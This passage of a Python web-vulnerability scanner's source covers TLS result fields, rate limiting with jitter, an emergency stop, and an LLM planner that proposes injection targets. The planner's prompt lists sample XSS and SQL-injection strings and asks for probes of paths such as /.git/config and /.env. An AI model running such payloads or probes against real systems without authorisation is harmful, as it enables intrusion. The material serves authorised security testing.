    days_until_expiry: Optional[int] = None
    is_expired: bool = False
    is_self_signed: bool = False
    is_untrusted_root: bool = False
    hostname_mismatch: bool = False
    negotiated_cipher: str = ""
    negotiated_protocol: str = ""
    weak_ciphers_detected: List[str] = field(default_factory=list)
    weak_protocols_detected: List[str] = field(default_factory=list)
    # Weak public-key sizes in the chain, e.g. ["leaf: RSA 1024-bit (<2048)"].
    weak_key_sizes_detected: List[str] = field(default_factory=list)
    # Weak signature algorithms in the chain, e.g. ["leaf: sha1WithRSAEncryption"].
    weak_signature_algorithms_detected: List[str] = field(default_factory=list)
    pem_chain: str = ""           # full chain in PEM, saved to evidence dir
    # --- testssl-style cipher enumeration (NEW) ---
    # Every cipher suite the server accepted/rejected across the curated
    # probe set, each entry: {cipher, protocol, accepted, strength, reason,
    # severity}. strength is "weak"/"strong" per bin/weak_ciphers.txt.
    supported_ciphers: List[Dict[str, Any]] = field(default_factory=list)
    # --- decoded certificate chain (NEW) ---
    # One entry per cert in the presented chain (leaf first): {position,
    # role, subject, issuer, not_before, not_after, is_ca, is_self_signed,
    # signature_algorithm}. Decoded via the cryptography lib; empty if the
    # lib is unavailable. The raw PEM stays in pem_chain.
    cert_chain_details: List[Dict[str, Any]] = field(default_factory=list)
    # --- protocol support flags (NEW) ---
    # True when the server completed a handshake pinned to that protocol
    # version. supports_sslv2/sslv3 are best-effort: modern Python builds
    # cannot negotiate SSLv2/v3 at all, so these are effectively always
    # False unless an old Python/OpenSSL is in use.
    supports_tls_1_0: bool = False
    supports_tls_1_1: bool = False
    supports_tls_1_2: bool = False
    supports_tls_1_3: bool = False
    supports_sslv2: bool = False
    supports_sslv3: bool = False


# ============================================================================
# SECTION 4 — GLOBAL STATE FOR SIGNAL HANDLER
# ============================================================================
#
# Python signal handlers cannot easily receive context. We use a small
# singleton container so the SIGINT/SIGTERM handler can reach the browser
# instance and trigger the asyncio.Event that all coroutines check between
# steps. This is a deliberate, minimal use of module-level mutable state —
# exactly the kind of thing that should be documented and audited.

class GlobalState:
    """Runtime container reachable by signal handlers.

    WHY GLOBAL: signal.signal() callbacks only receive (signum, frame).
    We cannot pass the browser or the asyncio loop as arguments. A single
    GLOBAL_STATE instance is the simplest correct pattern. We do NOT use
    threading.Event because we are async-only — asyncio.Event is checked
    via `await asyncio.sleep(0)` patterns and is cheaper to poll.
    """

    def __init__(self) -> None:
        self.browser: Optional[Browser] = None
        self.playwright_ctx: Optional[Any] = None
        self.stop_event: asyncio.Event = asyncio.Event()
        self.scan_started_at: Optional[datetime] = None
        self.interrupted: bool = False
        # The execution-trail logger. Set in main() after the output dir is
        # created. The _pw() helper reads this to log Playwright timeouts.
        self.logger: Optional[ExecutionTrailLogger] = None
        # Evidence accumulated so far. Used by the emergency-stop path
        # to render a partial report even if the scan was cut short.
        self.partial_findings: List[Finding] = []
        self.partial_crawl_map: List[CrawledURL] = []
        self.partial_attack_surface: List[InputField] = []
        self.partial_headers: List[HeaderRecord] = []
        self.partial_ssl: Optional[SSLRecord] = None
        # Current scan phase, updated at phase boundaries. Read by the
        # _heartbeat_keeper background task so the external supervisor's
        # heartbeat.json carries useful phase info (the kill decision itself
        # is timestamp-only — this is just for log readability).
        self.current_phase: str = "startup"


# The single shared instance. Imported by the signal handler below.
GLOBAL_STATE = GlobalState()


# ============================================================================
# SECTION 5 — VERBOSE LOGGER + EXECUTION TRAIL
# ============================================================================
#
# Two channels of output, both ALWAYS on:
#   1. stdout — human-readable, real-time, with timestamps.
#   2. execution_trail.json — structured JSON Lines, one entry per action.
#
# The HTML report reads execution_trail.json to construct the "Steps to
# Reproduce" sections. This means the report's narrative is GROUNDED in
# actual events rather than reconstructed after the fact — important for
# audit defensibility.

class ExecutionTrailLogger:
    """Dual-channel logger: stdout (verbose) + JSON-Lines trail file.

    WHY JSON LINES (JSONL) instead of a single JSON array:
    A single JSON array must be loaded fully into memory to be parsed,
    which fails for very long scans. JSONL (one JSON object per line)
    streams cleanly and is robust to mid-scan interruption — even if the
    last line is truncated, all previous lines remain valid.
    """

    def __init__(self, trail_path: Path) -> None:
        self.trail_path = trail_path
        # Configure Python logging for stdout. We use a custom format that
        # includes millisecond timestamps so the engineer can correlate
        # terminal output with the JSON trail file during post-scan review.
        self._logger = logging.getLogger("webrecon")
        self._logger.setLevel(logging.INFO)  # VERBOSE BY DEFAULT — never lower
        # Avoid duplicate handlers if the logger was already configured.
        if not self._logger.handlers:
            handler = logging.StreamHandler(sys.stdout)
            handler.setFormatter(logging.Formatter(
                fmt="%(asctime)s.%(msecs)03d [%(levelname)s] %(message)s",
                datefmt="%Y-%m-%d %H:%M:%S",
            ))
            self._logger.addHandler(handler)
        # Open the trail file in append-binary mode so each .log() call
        # flushes immediately. We never buffer — if the scan crashes we
        # want every line written up to the crash point.
        self.trail_path.parent.mkdir(parents=True, exist_ok=True)
        self._fh = open(self.trail_path, "a", encoding="utf-8")

    def log(self, action: str, result: str = "", **extra: Any) -> None:
        """Emit a single trail entry to BOTH channels atomically.

        Parameters
        ----------
        action : short verb phrase, e.g. 'navigate', 'inject_payload'
        result : human-readable outcome, e.g. '200 OK', 'pattern matched'
        extra  : arbitrary structured fields appended to the JSON record
        """
        ts = datetime.now(timezone.utc).isoformat(timespec="milliseconds")
        record = {
            "ts": ts,
            "action": action,
            "result": result,
            **extra,  # flatten any extra structured fields
        }
        # 1) stdout — human-readable, real-time
        msg = f"{action}: {result}" if result else action
        for k, v in extra.items():
            msg += f" | {k}={v}"
        self._logger.info(msg)
        # 2) JSONL file — structured, machine-readable
        self._fh.write(json.dumps(record, ensure_ascii=False, default=str) + "\n")
        self._fh.flush()


# ============================================================================
# SECTION 6 — RATE LIMITER (with ±10% jitter)
# ============================================================================
#
# WHY JITTER: A constant 500ms delay produces perfectly periodic traffic
# that any modern WAF can fingerprint as a scanner within ~20 requests.
# Adding ±10% random jitter makes the traffic pattern look human-ish
# without significantly slowing the scan. This is NOT stealth — it is
# politeness. The engineer must still obtain written authorisation.

class RateLimiter:
    """Async rate limiter with ±10% jitter and bounded concurrency.

    Concurrency is bounded by an asyncio.Semaphore. The default is 1
    (sequential), the hard maximum is 3. We refuse higher values because
    Playwright contexts are memory-heavy (~80MB each) and aggressive
    parallelism risks destabilising the target — which would violate
    the scope-of-work authorisation.
    """

    HARD_MAX_CONCURRENCY = 3

    def __init__(self, delay_ms: int, concurrency: int) -> None:
        if concurrency < 1:
            raise ValueError("concurrency must be >= 1")
        if concurrency > self.HARD_MAX_CONCURRENCY:
            raise ValueError(
                f"concurrency {concurrency} exceeds hard limit "
                f"{self.HARD_MAX_CONCURRENCY}. Use --concurrency 1..3."
            )
        self.base_delay_ms = max(0, int(delay_ms))
        # asyncio.Semaphore enforces the concurrency cap. Each acquire()
        # MUST be paired with a release() — we use `async with` for safety.
        self._sem = asyncio.Semaphore(concurrency)

    async def acquire(self) -> None:
        """Wait for a concurrency slot, then enforce the post-request delay.

        Called BEFORE sending each request. The delay is applied AFTER
        the previous request returns, not before — this ensures we don't
        hammer the target even if requests are very fast.
        """
        await self._sem.acquire()
        # Jitter: ±10% of the base delay. We use random.uniform (not gauss)
        # because the distribution should be bounded — a long-tail jitter
        # could starve the worker pool.
        if self.base_delay_ms > 0:
            jitter = random.uniform(-0.1, 0.1) * self.base_delay_ms
            actual_ms = max(0, self.base_delay_ms + jitter)
            await asyncio.sleep(actual_ms / 1000.0)

    def release(self) -> None:
        """Release the concurrency slot. Pair with acquire()."""
        self._sem.release()

    # Convenience context manager so callers can write:
    #     async with rate_limiter.slot():
    #         ...do work...
    class _Slot:
        def __init__(self, owner: "RateLimiter") -> None:
            self._owner = owner

        async def __aenter__(self) -> "_Slot":
            await self._owner.acquire()
            return self

        async def __aexit__(self, *exc: Any) -> None:
            self._owner.release()

    def slot(self) -> "_Slot":
        """Async context manager wrapping acquire/release."""
        return self._Slot(self)


# ============================================================================
# SECTION 7 — EMERGENCY STOP (SIGINT / SIGTERM handler)
# ============================================================================
#
# We install handlers for both SIGINT (Ctrl+C from a TTY) and SIGTERM
# (sent by `kill` or by container orchestrators). The handler sets the
# global asyncio.Event, which every long-running coroutine checks in its
# loop condition. We CANNOT do heavy work in the signal handler itself
# (Python restricts handlers to async-signal-safe operations), so the
# actual browser teardown + report rendering happens in the main async
# task after it observes the event.

def install_signal_handlers(logger: ExecutionTrailLogger) -> None:
    """Bind SIGINT and SIGTERM to a graceful-shutdown callback.

    The callback only:
      1. Logs the interruption.
      2. Sets GLOBAL_STATE.stop_event (an asyncio.Event).
      3. Marks GLOBAL_STATE.interrupted = True.
    All subsequent coroutines must poll `stop_event.is_set()` and exit
    their loops promptly. The orchestrator then renders the partial report.
    """

    def _handler(signum: int, frame: Any) -> None:
        sig_name = signal.Signals(signum).name
        # NOTE: We must NOT call logger.log() here directly because logging
        # is not async-signal-safe. We write to stderr instead.
        print(f"\n[!] Received {sig_name} — initiating graceful shutdown...",
              file=sys.stderr, flush=True)
        GLOBAL_STATE.interrupted = True
        # asyncio.Event.set() is NOT async-signal-safe either, but in
        # CPython it is implemented in C and is effectively atomic. The
        # worst case is a one-cycle delay before the main loop notices.
        try:
            GLOBAL_STATE.stop_event.set()
        except RuntimeError:
            # No running loop yet — set the underlying flag manually.
            GLOBAL_STATE.stop_event = asyncio.Event()
            GLOBAL_STATE.stop_event.set()

    # SIGINT is always available; SIGTERM may be absent on Windows.
    signal.signal(signal.SIGINT, _handler)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, _handler)


# ============================================================================
# SECTION 8 — LLM ADAPTER (Executive Summary ONLY)
# ============================================================================
#
# This is the ONLY place the tool touches an LLM, and it is used ONLY to
# generate natural-language summary text for the HTML report's Executive
# Summary tab. The LLM NEVER:
#   - Decides whether a finding is a true positive.
#   - Modifies raw evidence (requests, responses, screenshots).
#   - Alters the final verdict or severity.
#
# If the LLM endpoint is unreachable, returns an error, or exceeds the
# configured token budget, the tool degrades gracefully: the Executive
# Summary tab is populated with a deterministic, rule-based fallback
# string built from the actual finding counts. The report is always
# rendered, with or without LLM assistance.

# Strip <think>...</think> tags from LLM responses. Reasoning models like
# DeepSeek-R1, QwQ, and others prepend their internal reasoning inside
# <think> tags. These should NEVER appear in the report or trail.
import re as _re_module
_THINK_PATTERN = _re_module.compile(
    r'<think\b[^>]*>.*?</think\s*>',
    _re_module.DOTALL | _re_module.IGNORECASE,
)
# Also handle unclosed <think> tags (model output got cut off)
_THINK_OPEN_PATTERN = _re_module.compile(
    r'<think\b[^>]*>.*',
    _re_module.DOTALL | _re_module.IGNORECASE,
)

def _strip_think_tags(text: str) -> str:
    """Remove <think>...</think> blocks from LLM responses."""
    if not text or "<think" not in text.lower():
        return text
    # First try to remove complete <think>...</think> blocks
    text = _THINK_PATTERN.sub("", text)
    # Then remove any unclosed <think>... (at end of response)
    text = _THINK_OPEN_PATTERN.sub("", text)
    # Clean up extra whitespace left behind
    text = _re_module.sub(r'\n{3,}', '\n\n', text)
    return text.strip()


def _repair_json(json_str: str) -> str:
    """Attempt to repair common LLM JSON errors.

    LLMs sometimes produce JSON with:
    - Missing commas between items (e.g. {"a": "b" "c": "d"})
    - Trailing commas before } or ] (e.g. {"a": "b",})
    - Single quotes instead of double quotes
    - Unescaped newlines in string values
    - Unescaped quotes inside string values (e.g. {"reason": "it's "cool""})
    - Comments (// or /* */)
    - Unquoted keys (e.g. {priority_inputs: [...]})

    This function tries to fix these issues so json.loads() succeeds.
    """
    # 0. Remove comments
    json_str = _re_module.sub(r'//[^\n]*', '', json_str)  # // line comments
    json_str = _re_module.sub(r'/\*.*?\*/', '', json_str, flags=_re_module.DOTALL)  # /* block */

    # 1. Fix missing commas between key-value pairs
    # Pattern: "value" "key" → "value", "key"
    json_str = _re_module.sub(r'"\s*\n\s*"', '", "', json_str)
    # Pattern: "value"} "key" → "value"}, "key" (between objects in array)
    json_str = _re_module.sub(r'"\s*\}\s*\{', '"}, {', json_str)
    # Pattern: ] "key" → ], "key"
    json_str = _re_module.sub(r'"\s*\]\s*\{', '"], {', json_str)
    # Pattern: number "key" → number, "key"
    json_str = _re_module.sub(r'(\d)\s*\n\s*"', r'\1, "', json_str)
    # Pattern: true/false "key" → true/false, "key"
    json_str = _re_module.sub(r'(true|false|null)\s*\n\s*"', r'\1, "', json_str)
    # Pattern: ] "key" → ], "key" (after array)
    json_str = _re_module.sub(r'(\])\s*\n\s*"', r'\1, "', json_str)
    # Pattern: } "key" → }, "key" (after object)
    json_str = _re_module.sub(r'(\})\s*\n\s*"', r'\1, "', json_str)

    # 2. Fix trailing commas
    json_str = _re_module.sub(r',\s*\}', '}', json_str)
    json_str = _re_module.sub(r',\s*\]', ']', json_str)

    # 3. Fix single quotes → double quotes (only for keys/values)
    # Be careful not to replace quotes inside string values
    # This is a best-effort fix — may not work for all cases
    json_str = _re_module.sub(r"'([^']*)':", r'"\1":', json_str)

    # 4. Fix unquoted keys (e.g. {priority_inputs: [...]} → {"priority_inputs": [...]})
    json_str = _re_module.sub(r'([{,]\s*)([a-zA-Z_][a-zA-Z0-9_]*)\s*:', r'\1"\2":', json_str)

    # 5. Fix unescaped newlines inside string values
    # (json.loads doesn't allow literal newlines in strings)
    json_str = _re_module.sub(r'(?<=": ")(.*?)(?=")', lambda m: m.group(1).replace('\n', '\\n'), json_str)

    # 6. Fix unescaped tabs inside string values
    json_str = json_str.replace('\t', '\\t')

    return json_str


class LLMAdapter:
    """Abstract LLM client. Concrete subclasses implement the API call.

    Configuration is read from environment variables (or a .env file if
    python-dotenv is available):
      LLM_BASE_URL       — full URL of the chat-completions endpoint
      LLM_API_KEY        — bearer token
      LLM_MODEL          — model identifier (e.g. 'gpt-4o-mini')

    The class is intentionally minimal: a single `summarize()` method
    that takes a structured findings digest and returns prose. We do NOT
    stream tokens (the summaries are short) and we do NOT retry (the
    fallback is acceptable).
    """

    def __init__(self, max_tokens: int = 4000) -> None:
        # Load .env if dotenv is available. If not, environment variables
        # must be set in the shell.
        if _HAS_DOTENV:
            load_dotenv()
        self.base_url = os.environ.get("LLM_BASE_URL", "").rstrip("/")
        self.api_key = os.environ.get("LLM_API_KEY", "")
        self.model = os.environ.get("LLM_MODEL", "gpt-4o-mini")
        # Token budget. We truncate the findings digest to fit. The default
        # 4000 is conservative — most endpoints accept 8k+ but we want the
        # executive summary to be CONCISE, not a wall of text.
        self.max_tokens = max(256, int(max_tokens))
        # The LLM is "enabled" if a base URL is configured. We do NOT
        # require an API key — many local LLM servers (Ollama, LM Studio,
        # vLLM, llama.cpp server) don't use authentication. For those,
        # the Authorization header is simply omitted in _call_endpoint.
        # Previously this was `bool(self.base_url and self.api_key)`
        # which silently disabled the LLM for local setups.
        self.enabled = bool(self.base_url)

    async def summarize(self, digest: Dict[str, Any]) -> str:
        """Return natural-language summary text, or a deterministic fallback.

        Parameters
        ----------
        digest : a dict containing at minimum:
            - target_url: str
            - total_findings: int
            - by_severity: Dict[str, int]   # {'High': n, 'Medium': n, ...}
            - top_findings: List[Dict]      # the highest-severity findings
            - ssl_issues: List[str]
            - missing_headers: List[str]

        Returns
        -------
        A 2–4 paragraph executive summary string. NEVER used to make
        decisions — only to render prose for management.
        """
        if not self.enabled:
            return self._fallback_summary(digest)
        try:
            # Build a compact prompt. We prioritise high-severity findings
            # so that if truncation kicks in, the most important context
            # survives.
            prompt = self._build_prompt(digest)
            # Truncate prompt to a conservative char budget (~4 chars/token).
            char_budget = self.max_tokens * 4
            if len(prompt) > char_budget:
                prompt = prompt[:char_budget] + "\n[truncated]"
            summary = await self._call_endpoint(prompt)
            if not summary or not summary.strip():
                return self._fallback_summary(digest)
            # Double-check: strip any <think> tags that slipped through
            summary = _strip_think_tags(summary)
            return summary.strip()
        except Exception as e:
            # NEVER raise — graceful degradation is mandatory.
            return (self._fallback_summary(digest)
                    + f"\n\n[LLM endpoint unavailable: {type(e).__name__}: {e}]")

    # --- Hooks for concrete subclasses ------------------------------------
    async def _call_endpoint(self, prompt: str, system: Optional[str] = None) -> str:
        """Override in subclass to perform the actual HTTP call.

        The default implementation uses urllib (stdlib) so the tool works
        without `requests` or `httpx`. This is intentional for airgap
        compatibility — but note that urllib does not support streaming,
        which is fine for our short summaries.

        ``system`` selects the system message. If None (default) the
        executive-summary persona is used — appropriate ONLY for the report
        summariser. JSON-returning callers (the LLM planner, the directory
        brute-force wordlist reorder) MUST pass their own system message;
        otherwise the summariser persona conflicts with their user prompt
        and smaller/local LLMs emit prose instead of JSON (which then fails
        to parse → empty result).
        """
        import urllib.request
        import urllib.error
        if not self.base_url:
            return ""
        if system is None:
            system = ("You are a security report summariser. "
                      "Produce a factual, neutral executive summary "
                      "in 2-4 paragraphs. Do NOT confirm or deny "
                      "any finding — every finding is unverified. "
                      "Do NOT invent details not present in the input.")
        payload = json.dumps({
            "model": self.model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": prompt},
            ],
            # Respect the user's --llm-tokens setting (which itself may come
            # from the WEBRECON_LLM_MAX_TOKENS env override on the web side).
            # Bounded at 32768 to catch absurd values while allowing large
            # JSON responses for vulnerability analysis / reasoning models.
            "max_tokens": min(self.max_tokens, 32768),
            "temperature": 0.2,  # low temperature for factual output
        }).encode("utf-8")
        req = urllib.request.Request(
            self.base_url,
            data=payload,
            headers={
                "Content-Type": "application/json",
                # Only send Authorization when a key is set — local LLM
                # servers (Ollama, LM Studio, llama.cpp, vLLM) don't use
                # auth and some reject empty/malformed bearer headers.
                **({"Authorization": f"Bearer {self.api_key}"}
                   if self.api_key else {}),
            },
            method="POST",
        )
        # Run the blocking HTTP call in a thread to stay async-friendly.
        # CRITICAL: pass timeout= as a KEYWORD arg. The signature is
        # `urlopen(url, data=None, timeout=...)` — passing 30 positionally
        # sets data=30 (an int), which makes urllib raise
        # "TypeError: message_body should be a bytes-like object or an
        # iterable, got <class 'int'>" because it tries to send 30 as the
        # request body.
        #
        # Timeout is configurable via the WEBRECON_LLM_TIMEOUT_SECONDS env
        # var (default: 120s). Increase it for slow LLMs:
        #   WEBRECON_LLM_TIMEOUT_SECONDS=300   # 5 minutes
        llm_timeout = int(os.environ.get("WEBRECON_LLM_TIMEOUT_SECONDS", "120"))
        loop = asyncio.get_running_loop()
        try:
            resp = await loop.run_in_executor(
                None, lambda: urllib.request.urlopen(req, timeout=llm_timeout)
            )
            body = resp.read().decode("utf-8", errors="replace")
            data = json.loads(body)
            # OpenAI-compatible response shape.
            content = data.get("choices", [{}])[0].get("message", {}).get("content", "")

            # --- Handle company LLM proxies that base64-encode content ---
            # Some corporate LLM proxies encode the message content in
            # base64 to prevent JSON injection / HTML breaking. If the
            # content looks like base64 (only alphanumeric + /=, length > 20,
            # decodes to valid UTF-8), decode it.
            if content and len(content) > 20:
                import base64 as _b64
                # Check if it looks like base64: only valid chars, correct length
                stripped_content = content.strip()
                # Remove any whitespace/newlines that some proxies add
                compact = stripped_content.replace("\n", "").replace("\r", "").replace(" ", "")
                if compact and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in compact):
                    try:
                        decoded = _b64.b64decode(compact).decode("utf-8", errors="replace")
                        # Only use the decoded version if it looks like text
                        # (contains common ASCII/UTF-8 chars, not binary garbage)
                        if decoded and any(c.isalpha() for c in decoded[:100]):
                            content = decoded
                    except Exception:
                        pass  # Not valid base64 — use the original content

            # Strip <think>...</think> tags that reasoning models (DeepSeek,
            # QwQ, etc.) prepend to their responses. These tags contain the
            # model's internal reasoning and should NOT appear in the report.
            content = _strip_think_tags(content)
            return content
        except urllib.error.URLError:
            return ""
        except (json.JSONDecodeError, KeyError, IndexError):
            return ""

    # --- Prompt construction ----------------------------------------------
    def _build_prompt(self, digest: Dict[str, Any]) -> str:
        """Serialise the digest into a compact text prompt.

        We deliberately avoid JSON-in-prompt here because some LLMs handle
        prose better than structured data for summarisation tasks. The
        prompt is plain text with clear section markers.
        """
        lines = [
            f"Target: {digest.get('target_url', 'unknown')}",
            f"Total unverified findings: {digest.get('total_findings', 0)}",
            "Findings by severity:",
        ]
        for sev, n in digest.get("by_severity", {}).items():
            lines.append(f"  - {sev}: {n}")
        lines.append("")
        lines.append("Top findings (highest severity first):")
        for i, f in enumerate(digest.get("top_findings", [])[:10], 1):
            lines.append(
                f"  {i}. [{f.get('severity','?')}] {f.get('title','?')} "
                f"at {f.get('url','?')} (category: {f.get('owasp_category','?')})"
            )
        if digest.get("ssl_issues"):
            lines.append("")
            lines.append("SSL/TLS issues:")
            for s in digest["ssl_issues"]:
                lines.append(f"  - {s}")
        if digest.get("missing_headers"):
            lines.append("")
            lines.append("Missing security headers:")
            for h in digest["missing_headers"]:
                lines.append(f"  - {h}")
        lines.append("")
        lines.append("Write a neutral, factual 2-4 paragraph executive summary.")
        lines.append("Explicitly state that all findings are unverified and "
                     "require manual confirmation by a qualified engineer.")
        return "\n".join(lines)

    # --- Deterministic fallback -------------------------------------------
    def _fallback_summary(self, digest: Dict[str, Any]) -> str:
        """Rule-based summary used when the LLM is unavailable or fails.

        This MUST be sufficient on its own — never rely on the LLM being
        reachable. The text is built from concrete counts so it is always
        accurate even if the LLM would have phrased things more eloquently.
        """
        total = digest.get("total_findings", 0)
        sev = digest.get("by_severity", {})
        target = digest.get("target_url", "the target")
        parts = [
            (f"An automated assessment of {target} completed. "
             f"A total of {total} unverified findings were recorded, "
             f"of which {sev.get('High', 0)} are High severity, "
             f"{sev.get('Medium', 0)} Medium, and "
             f"{sev.get('Low', 0)} Low."),
            ("All findings are UNVERIFIED and require manual confirmation "
             "by a qualified security engineer before any remediation is "
             "undertaken. The raw HTTP request/response pairs, screenshots, "
             "and execution trails are available in the Evidence Vault tab "
             "of this report for audit purposes."),
        ]
        if digest.get("ssl_issues"):
            parts.append(
                "SSL/TLS review identified the following items for manual "
                "inspection: " + "; ".join(digest["ssl_issues"]) + "."
            )
        if digest.get("missing_headers"):
            parts.append(
                "The following security headers were absent from the initial "
                "response and should be reviewed: "
                + ", ".join(digest["missing_headers"]) + "."
            )
        return "\n\n".join(parts)


# ============================================================================
# SECTION 8.5 — LLM PLANNER (LLM-in-the-Loop Adaptive Scanning)
# ============================================================================
#
# The LLMPlanner is the "LLM-in-the-loop" component. AFTER the crawler
# has discovered URLs and the Attack Surface Mapper has catalogued inputs,
# but BEFORE active fuzzing begins, the planner sends a digest of these
# results to the LLM and asks it to suggest:
#
#   1. Priority inputs — which inputs look most promising for injection
#      (e.g. search boxes, login forms, ID-style URL parameters).
#   2. Custom payloads — tech-stack-specific payloads the LLM thinks
#      will be effective (e.g. NoSQL injection for a Node.js app,
#      LDAP injection for an AD-backed app).
#   3. Additional URLs to crawl — patterns the LLM spotted that the BFS
#      crawler missed (e.g. /api/v2/ when /api/v1/ was found).
#   4. Reasoning — a brief explanation of why the LLM made each suggestion.
#
# CRITICAL: The LLM NEVER executes anything. It only returns a JSON plan.
# The scanner's orchestrator merges the plan into the existing payload list
# and input priority order, then executes with the same scope/exclude/rate-
# limit constraints as always. The LLM cannot escape scope, cannot disable
# rate limiting, cannot skip evidence collection. It is an advisor that
# directs the scanner's ATTENTION, not an autonomous agent.
#
# The plan is saved to llm_plan.json in the output folder for the engineer's
# audit trail. The HTML report's Live View shows it in a dedicated sub-tab.

class LLMPlanner:
    """Asks the LLM to plan the active-scanning phase based on crawl results.

    Used only when --llm-assist is passed. If the LLM endpoint is not
    configured or returns an error, the planner degrades gracefully (returns
    an empty plan) and the scanner proceeds with its default behaviour.
    """

    def __init__(self, llm_adapter: LLMAdapter, logger: ExecutionTrailLogger) -> None:
        self.llm = llm_adapter
        self.logger = logger

    async def plan(
        self,
        target_url: str,
        crawl_map: List["CrawledURL"],
        attack_surface: List["InputField"],
        header_records: List["HeaderRecord"],
    ) -> Dict[str, Any]:
        """Ask the LLM to analyse the crawl results and return a scan plan.

        Returns a dict with keys:
          - priority_inputs: List[str]  (input names to test first)
          - custom_payloads: List[str]  (extra payloads to inject)
          - additional_urls: List[str]  (URLs to crawl that were missed)
          - reasoning: str              (LLM's explanation)
          - llm_error: Optional[str]    (populated if the LLM call failed)
        """
        # Build a compact digest of the crawl results. We cap the size to
        # stay within the LLM's context window (--llm-tokens budget).
        # We prioritise in-scope URLs and inputs with names (unnamed inputs
        # are not fuzzable anyway).
        in_scope_urls = [c.url for c in crawl_map if c.in_scope][:50]
        all_inputs = [
            {"name": i.name, "location": i.location, "url": i.url,
             "method": i.method, "type": i.input_type}
            for i in attack_surface if i.name
        ][:50]
        # Extract tech-stack hints from headers (Server, X-Powered-By).
        tech_hints = []
        for h in header_records:
            if h.name.lower() in ("server", "x-powered-by", "x-aspnet-version",
                                   "x-generator"):
                tech_hints.append(f"{h.name}: {h.value}")

        digest = {
            "target_url": target_url,
            "tech_hints": tech_hints[:5],
            "urls_discovered": len(crawl_map),
            "in_scope_urls_sample": in_scope_urls,
            "inputs_discovered": len(attack_surface),
            "inputs_sample": all_inputs,
        }

        self.logger.log(
            "llm_planner_start",
            f"analysing {len(in_scope_urls)} URLs + {len(all_inputs)} inputs; "
            f"tech_hints={tech_hints[:3]}",
        )

        if not self.llm.enabled:
            llm_url = os.environ.get("LLM_BASE_URL", "")
            if not llm_url:
                self.logger.log("llm_planner_skip",
                                "LLM not configured — LLM_BASE_URL env var is empty. "
                                "Check Settings → LLM config in the web UI.")
            else:
                self.logger.log("llm_planner_skip",
                                f"LLM not configured — LLM_BASE_URL={llm_url[:50]}...")
            return self._empty_plan("LLM not configured")

        prompt = self._build_prompt(digest)
        try:
            raw_response = await self.llm._call_endpoint(
                prompt,
                system=("You are a web penetration testing planner. "
                        "You output ONLY a JSON object — no prose, "
                        "no markdown fences, no explanation outside the JSON."),
            )
            if not raw_response or not raw_response.strip():
                return self._empty_plan("LLM returned empty response")
            plan = self._parse_plan(raw_response)
            self.logger.log(
                "llm_planner_done",
                f"priority_inputs={len(plan.get('priority_inputs', []))} "
                f"custom_payloads={len(plan.get('custom_payloads', []))} "
                f"additional_urls={len(plan.get('additional_urls', []))}",
            )
            return plan
        except Exception as e:
            self.logger.log("llm_planner_error", f"{type(e).__name__}: {e}")
            return self._empty_plan(f"{type(e).__name__}: {e}")

    def _build_prompt(self, digest: Dict[str, Any]) -> str:
        """Build the prompt sent to the LLM.

        We ask for a strict JSON response so we can parse it reliably.
        The prompt explicitly tells the LLM NOT to include disclaimers
        or markdown fences — just raw JSON.
        """
        digest_json = json.dumps(digest, indent=2, ensure_ascii=False,
                                 default=str)
        # Truncate the digest if it's too long (conservative 4 chars/token).
        char_budget = self.llm.max_tokens * 4 - 1500  # leave room for prompt
        if len(digest_json) > char_budget:
            digest_json = digest_json[:char_budget] + "\n...[truncated]"

        return f"""You are a web penetration testing planner. Analyse the crawl results below and suggest a focused active-scanning plan.

TARGET:
{digest.get('target_url', 'unknown')}

TECH STACK HINTS (from response headers):
{json.dumps(digest.get('tech_hints', []), indent=2)}

CRAWL RESULTS DIGEST:
{digest_json}

Based on the URLs and inputs discovered, suggest:
1. priority_inputs: which input names look most promising for injection testing (e.g. search, q, id, user, email, url, redirect). List the input NAMES (not URLs).
2. custom_payloads: payloads to try IN ADDITION to the default XSS/SQLi list, TAILORED TO THE DISCOVERED INPUTS FIRST, then the tech stack. Specifically:
   - Derive payloads from the actual input names/types in the digest above: e.g. a param named redirect_to/url/next/return → open-redirect payloads; a search/q field → reflected-XSS variants; an id/userid param → SQLi/IDOR-style; a JSON-body (fetch_body) input → JSON-structured payloads; a textarea/message → multiline/stored-XSS; an upload/file input → upload-related probes.
   - THEN add tech-stack-specific payloads: if hints suggest Node.js/MongoDB, include NoSQL injection payloads; if PHP, PHP-specific; if ASP.NET, .NET-specific; if a template engine is hinted, SSTI variants.
   - CRITICAL: generate ONLY safe, non-destructive payloads (no DROP/DELETE/UPDATE, no DoS, no real external domains — use example.com/evil.com). Keep it to 5-15 payloads max.
   - FORMAT: each payload MUST be ONE raw injection string (e.g. "<script>alert(1)</script>", "' OR '1'='1", "https://evil.com"). NEVER an object, dict, or a description of an input — the inputs are already listed in the digest above; do not repeat them here.
3. additional_urls: URL patterns DERIVED FROM THE DISCOVERED URL STRUCTURE that might have been missed — parent dirs of known paths, versioned siblings (/v1/, /v2/), admin/API variants of discovered endpoints (e.g. seeing /api/users → /api/admin, /api/v1/users), plus common /admin/, /.git/config, /.env if not already present. These must be on the SAME domain. Max 5.
4. reasoning: a brief 1-2 sentence explanation of your suggestions.

Respond with RAW JSON only — no markdown fences, no preamble, no disclaimers. The JSON must have exactly these keys:

{{"priority_inputs": [], "custom_payloads": [], "additional_urls": [], "reasoning": ""}}"""

    def _parse_plan(self, raw_response: str) -> Dict[str, Any]:
        """Parse the LLM's JSON response into a plan dict.

        We're defensive here because LLMs sometimes wrap JSON in markdown
        fences, add preamble, or return multiple JSON objects. We strip
        common wrappers and use a brace-matching approach to extract
        exactly ONE valid JSON object.
        """
        # Strip <think>...</think> tags (reasoning models like DeepSeek-R1)
        raw_response = _strip_think_tags(raw_response)
        text = raw_response.strip()
        # Strip markdown code fences if present.
        if text.startswith("```"):
            # Remove the first line (```json or ```) and the last line (```).
            lines = text.split("\n")
            if lines[0].startswith("```"):
                lines = lines[1:]
            if lines and lines[-1].strip() == "```":
                lines = lines[:-1]
            text = "\n".join(lines)
        # Try to extract the JSON object using brace matching (not rfind).
        # The old code used rfind("}") which would include trailing junk
        # if the LLM returned extra text after the JSON. Brace matching
        # finds the FIRST complete JSON object.
        start = text.find("{")
        if start == -1:
            return self._empty_plan("No JSON object found in LLM response")
        # Walk forward from start, counting open/close braces (respecting strings).
        depth = 0
        in_string = False
        escape = False
        end = -1
        for i in range(start, len(text)):
            ch = text[i]
            if escape:
                escape = False
                continue
